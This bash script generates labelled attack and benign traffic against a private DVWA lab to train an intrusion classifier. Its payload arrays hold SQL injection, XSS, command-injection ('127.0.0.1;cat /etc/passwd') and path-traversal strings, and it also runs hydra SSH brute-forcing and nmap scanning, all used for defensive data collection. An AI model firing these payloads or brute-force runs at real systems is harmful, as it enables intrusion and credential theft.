#!/usr/bin/env bash
#
# collect_dataset.sh - collect a LABELLED, INTENSITY-VARIED dataset for the
# CyREN triage classifier, using the same real tools as the other lab scripts
# (sqlmap-style curl injection, hydra, nmap, curl). It runs many short "sessions",
# each with RANDOMISED intensity (request count + delay), so that attack and
# benign request_count RANGES OVERLAP (the "grey zone"). This forces the
# classifier to learn the real signal (attack payload present -> has_keyword)
# instead of the shortcut "high volume == attack".
#
# THIS IS DATASET COLLECTION, NOT EVASION. Every session is recorded with its
# TRUE label in the manifest, whether or not it happens to trip a detection rule
# (some low-rate attacks trip the rule, some do not - both are recorded). The
# goal is diverse, honestly-labelled samples for a more rigorous ML experiment;
# it does NOT search for a threshold that bypasses detection.
#
# Design (kept from the other scripts):
#   * attack sessions come from an ATTACK IP pool, benign from a BENIGN IP pool;
#     the label is the pool, so source_ip is only ever used to LABEL - it is
#     never a feature (export_training_set.py drops it).
#   * each session uses a FRESH source IP so CyREN records it as its own event
#     ( CyREN aggregates by (source_ip, rule); reusing an IP would merge them ).
#
# SAFETY: private (RFC1918) lab target only; refuses any public target. Use only
# on infrastructure you own and are authorised to test.
#
# Usage:
#   sudo IFACE=eth1 TARGET=192.168.56.101 ./collect_dataset.sh
#   sudo ./collect_dataset.sh --attack 20 --benign 20 --yes
#
set -uo pipefail

# ----------------------------------------------------------------- config
TARGET="${TARGET:-192.168.56.101}"
IFACE="${IFACE:-eth1}"                     # Kali Host-Only NIC (same as your other runs)
DVWA_USER="${DVWA_USER:-admin}"
DVWA_PASS="${DVWA_PASS:-password}"

# IP pools (last octet base). Chosen to avoid the existing fixed IPs
# (.101 target, .104/.105/.120/.122/.124/.150/.151/.152/.160/.161) and .1/.255.
IP_PREFIX="${IP_PREFIX:-192.168.56}"
ATTACK_OCT0="${ATTACK_OCT0:-170}"          # attack sessions -> .170, .171, ...
BENIGN_OCT0="${BENIGN_OCT0:-200}"          # benign sessions -> .200, .201, ...

N_ATTACK="${N_ATTACK:-20}"
N_BENIGN="${N_BENIGN:-20}"

# intensity randomisation ranges (the "grey zone": these OVERLAP on purpose)
ATK_REQ_MIN="${ATK_REQ_MIN:-1}";  ATK_REQ_MAX="${ATK_REQ_MAX:-40}"   # attack request count
BEN_REQ_MIN="${BEN_REQ_MIN:-5}";  BEN_REQ_MAX="${BEN_REQ_MAX:-60}"   # benign request count
DELAY_MS_MIN="${DELAY_MS_MIN:-0}"; DELAY_MS_MAX="${DELAY_MS_MAX:-2500}"  # per-request pause

MANIFEST="${MANIFEST:-$(cd "$(dirname "$0")" && pwd)/dataset_manifest.csv}"
ASSUME_YES=0

# --------------------------------------------------------------- arg parse
while [ $# -gt 0 ]; do
  case "$1" in
    --attack) N_ATTACK="$2"; shift 2 ;;
    --benign) N_BENIGN="$2"; shift 2 ;;
    --yes)    ASSUME_YES=1; shift ;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

# ------------------------------------------------------------- pretty print
c_ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_info() { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; }

# ------------------------------------------------------------ safety checks
case "$TARGET" in
  10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) : ;;
  *) c_err "TARGET $TARGET is not a private lab address. Refusing."; exit 1 ;;
esac
[ "$(id -u)" -eq 0 ] || { c_err "run as root (IP aliasing + source routing): sudo $0"; exit 1; }
command -v curl >/dev/null 2>&1 || { c_err "missing tool: curl"; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

echo
c_warn "CyREN dataset collector (grey-zone, intensity-varied, LABELLED)"
c_warn "  target        : $TARGET   iface: $IFACE"
c_warn "  attack sessions: $N_ATTACK  (IPs ${IP_PREFIX}.${ATTACK_OCT0}+)"
c_warn "  benign sessions: $N_BENIGN  (IPs ${IP_PREFIX}.${BENIGN_OCT0}+)"
c_warn "  manifest       : $MANIFEST"
c_warn "  NOTE: every session is recorded with its true label; this is data"
c_warn "        collection for the classifier, NOT detection evasion."
if [ "$ASSUME_YES" != 1 ]; then
  read -r -p "Generate the labelled dataset against $TARGET? [y/N] " a
  [ "$a" = "y" ] || [ "$a" = "Y" ] || { c_info "aborted."; exit 0; }
fi

# --------------------------------------------------------------- helpers
rnd()  { echo $(( RANDOM % ($2 - $1 + 1) + $1 )); }            # inclusive int in [$1,$2]
pause_ms() { local ms; ms=$(rnd "$DELAY_MS_MIN" "$DELAY_MS_MAX"); awk "BEGIN{system(\"sleep \" $ms/1000)}"; }

ALIASES=()
add_src() {                                   # add alias + route target out of it
  local ip="$1"
  ip addr add "$ip/24" dev "$IFACE" 2>/dev/null && ALIASES+=("$ip") || true
  ip route replace "$TARGET" dev "$IFACE" src "$ip"
}
cleanup() {
  c_info "cleaning up ${#ALIASES[@]} aliases + route"
  ip route replace "$TARGET" dev "$IFACE" 2>/dev/null || true
  for ip in "${ALIASES[@]:-}"; do ip addr del "$ip/24" dev "$IFACE" 2>/dev/null || true; done
}
trap cleanup EXIT

# DVWA login for a given cookie jar (web sessions need security=low)
dvwa_login() {
  local jar="$1" t
  t="$(curl -s -c "$jar" "http://$TARGET/dvwa/login.php" | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  curl -s -b "$jar" -c "$jar" -o /dev/null \
    --data "username=$DVWA_USER&password=$DVWA_PASS&Login=Login&user_token=$t" "http://$TARGET/dvwa/login.php"
  t="$(curl -s -b "$jar" "http://$TARGET/dvwa/security.php" | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  curl -s -b "$jar" -c "$jar" -o /dev/null \
    --data "security=low&seclevel=low&user_token=$t" "http://$TARGET/dvwa/security.php"
  grep -qi PHPSESSID "$jar"
}

# ---- payload sets (REAL attack strings; every attack request carries one) ----
SQLI=("1' UNION SELECT user,password FROM users-- -" "1' OR '1'='1" "1' AND 1=1-- -"
      "1' AND SLEEP(2)-- -" "1' AND extractvalue(1,concat(0x7e,version()))-- -")
XSS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg/onload=alert(1)>"
     "<body onload=alert(1)>")
CMD=("127.0.0.1;id" "127.0.0.1|whoami" "127.0.0.1&&uname -a" "127.0.0.1;cat /etc/passwd")
FI=("../../../../etc/passwd" "....//....//etc/passwd" "/etc/passwd" "php://filter/read=convert.base64-encode/resource=/etc/passwd")
# benign inputs to the SAME demo pages (no payload) - for benign sessions
BENIGN_SQLI=("id=1" "id=2" "id=3");  # harmless ids

# write manifest header once
[ -f "$MANIFEST" ] || echo "timestamp_utc,session_id,label,type,tool,source_ip,planned_requests,delay_range_ms,notes" > "$MANIFEST"

ATTACK_IPS=(); BENIGN_IPS=()
rec() {   # append a manifest row: $1 label $2 type $3 tool $4 ip $5 reqs $6 notes
  echo "$(date -u +%FT%TZ),$SID,$1,$2,$3,$4,$5,${DELAY_MS_MIN}-${DELAY_MS_MAX},$6" >> "$MANIFEST"
}

# --------------------------------------------------- attack session runners
# each sends N random real payloads of one class to the matching DVWA path
web_attack() {   # $1 type  $2 path  $3 param  (payload array passed by name)
  local type="$1" path="$2" param="$3"; shift 3
  local arr=("$@") ip jar n i p
  ip="${IP_PREFIX}.$((ATTACK_OCT0 + ${#ATTACK_IPS[@]}))"; ATTACK_IPS+=("$ip")
  add_src "$ip"; jar="$(mktemp)"
  dvwa_login "$jar" || { c_warn "login failed for $ip"; rm -f "$jar"; rec attack "$type" curl "$ip" 0 "login-failed"; return; }
  n=$(rnd "$ATK_REQ_MIN" "$ATK_REQ_MAX")
  c_info "attack $type from $ip : $n requests"
  for i in $(seq 1 "$n"); do
    p="${arr[$((RANDOM % ${#arr[@]}))]}"
    curl -s -b "$jar" -o /dev/null -G --data-urlencode "$param=$p" --data "Submit=Submit" \
      "http://$TARGET/dvwa/vulnerabilities/$path/"
    pause_ms
  done
  rm -f "$jar"; rec attack "$type" curl "$ip" "$n" "real payloads, path-based rule fires on any hit"
}

atk_ssh() {
  local ip pl n t; ip="${IP_PREFIX}.$((ATTACK_OCT0 + ${#ATTACK_IPS[@]}))"; ATTACK_IPS+=("$ip"); add_src "$ip"
  if ! have hydra; then rec attack ssh hydra "$ip" 0 "hydra-missing"; c_warn "hydra missing; skip"; return; fi
  pl="$(mktemp)"; printf '%s\n' 123456 password admin root toor letmein qwerty dvwa password123 P@ssw0rd changeme > "$pl"
  n=$(rnd 1 11); t=$(rnd 1 4)                     # random #passwords (<5 may NOT trip threshold)
  head -n "$n" "$pl" > "${pl}.n"
  c_info "attack ssh from $ip : $n passwords (t=$t)"
  hydra -l sysadmin -P "${pl}.n" -t "$t" -f -o /dev/null "ssh://$TARGET" >/dev/null 2>&1 || true
  rm -f "$pl" "${pl}.n"; rec attack ssh hydra "$ip" "$n" "threshold rule (>=5); low n may not fire = recorded anyway"
}

atk_scan() {
  local ip lo hi rate; ip="${IP_PREFIX}.$((ATTACK_OCT0 + ${#ATTACK_IPS[@]}))"; ATTACK_IPS+=("$ip"); add_src "$ip"
  if ! have nmap; then rec attack scan nmap "$ip" 0 "nmap-missing"; c_warn "nmap missing; skip"; return; fi
  hi=$(rnd 20 1000); rate=$(rnd 50 400)           # random port span + rate (low may NOT trip PORTSCAN)
  c_info "attack scan from $ip : ports 1-$hi rate $rate"
  nmap -sT -p "1-$hi" --max-rate "$rate" -Pn "$TARGET" >/dev/null 2>&1 || true
  rec attack scan nmap "$ip" "$hi" "iptables PORTSCAN threshold; low may not fire = recorded anyway"
}

# --------------------------------------------------- benign session runner
BASELINE=("dvwa/index.php" "dvwa/about.php" "dvwa/instructions.php" "dvwa/security.php"
          "dvwa/dvwa/css/main.css" "dvwa/dvwa/js/dvwaPage.js" "dvwa/dvwa/images/logo.png")
sess_benign() {
  local ip jar n i; ip="${IP_PREFIX}.$((BENIGN_OCT0 + ${#BENIGN_IPS[@]}))"; BENIGN_IPS+=("$ip")
  add_src "$ip"; jar="$(mktemp)"
  dvwa_login "$jar" || { c_warn "login failed for $ip"; rm -f "$jar"; rec benign browse curl "$ip" 0 "login-failed"; return; }
  n=$(rnd "$BEN_REQ_MIN" "$BEN_REQ_MAX")          # may be HIGH -> overlaps attack request_count
  c_info "benign from $ip : $n requests"
  for i in $(seq 1 "$n"); do
    case $((RANDOM % 5)) in
      0) curl -s -b "$jar" -o /dev/null "http://$TARGET/${BASELINE[$((RANDOM % ${#BASELINE[@]}))]}" ;;
      1) curl -s -b "$jar" -o /dev/null "http://$TARGET/dvwa/vulnerabilities/sqli/?${BENIGN_SQLI[$((RANDOM % 3))]}&Submit=Submit" ;;
      2) curl -s -b "$jar" -o /dev/null -G --data-urlencode "name=John" --data "Submit=Submit" "http://$TARGET/dvwa/vulnerabilities/xss_r/" ;;
      3) curl -s -b "$jar" -o /dev/null --data-urlencode "ip=127.0.0.1" --data "Submit=Submit" "http://$TARGET/dvwa/vulnerabilities/exec/" ;;
      4) curl -s -b "$jar" -o /dev/null "http://$TARGET/dvwa/vulnerabilities/fi/?page=include.php" ;;
    esac
    pause_ms
  done
  rm -f "$jar"; rec benign browse curl "$ip" "$n" "legit inputs (id=1/name=John/127.0.0.1/include.php), no payload"
}

# weighted attack-type picker (path-based dominate the grey zone; ssh/scan occasional)
ATK_TYPES=(sqli sqli sqli xss xss cmd cmd fi fi ssh scan)
run_attack() {
  case "${ATK_TYPES[$((RANDOM % ${#ATK_TYPES[@]}))]}" in
    sqli) web_attack sqli sqli   id   "${SQLI[@]}" ;;
    xss)  web_attack xss  xss_r  name "${XSS[@]}"  ;;
    cmd)  web_attack cmd  exec   ip   "${CMD[@]}"  ;;
    fi)   web_attack fi   fi     page "${FI[@]}"   ;;
    ssh)  atk_ssh ;;
    scan) atk_scan ;;
  esac
}

# ------------------------------------------------------------------- run
SID=0
c_info "running $N_ATTACK attack + $N_BENIGN benign sessions (randomised intensity)"
# interleave attack/benign roughly evenly
a=0; b=0
while [ "$a" -lt "$N_ATTACK" ] || [ "$b" -lt "$N_BENIGN" ]; do
  SID=$((SID + 1))
  if [ "$b" -ge "$N_BENIGN" ] || { [ "$a" -lt "$N_ATTACK" ] && [ $((RANDOM % 2)) -eq 0 ]; }; then
    run_attack; a=$((a + 1))
  else
    sess_benign; b=$((b + 1))
  fi
done

# ---- summary: the exact IP lists to feed the labeller on the CyREN host ----
join() { local IFS=,; echo "$*"; }
echo
c_ok "done. $SID sessions recorded in $MANIFEST"
c_info "attack IPs used: $(join "${ATTACK_IPS[@]:-}")"
c_info "benign IPs used: $(join "${BENIGN_IPS[@]:-}")"
echo
c_info "On the CyREN host, after backfill, label with:"
echo "  python scripts/export_training_set.py \\"
echo "    --attack-ips $(join "${ATTACK_IPS[@]:-}") \\"
echo "    --benign-ips $(join "${BENIGN_IPS[@]:-}")"
c_info "source_ip stays label-only; it is never written as a feature."
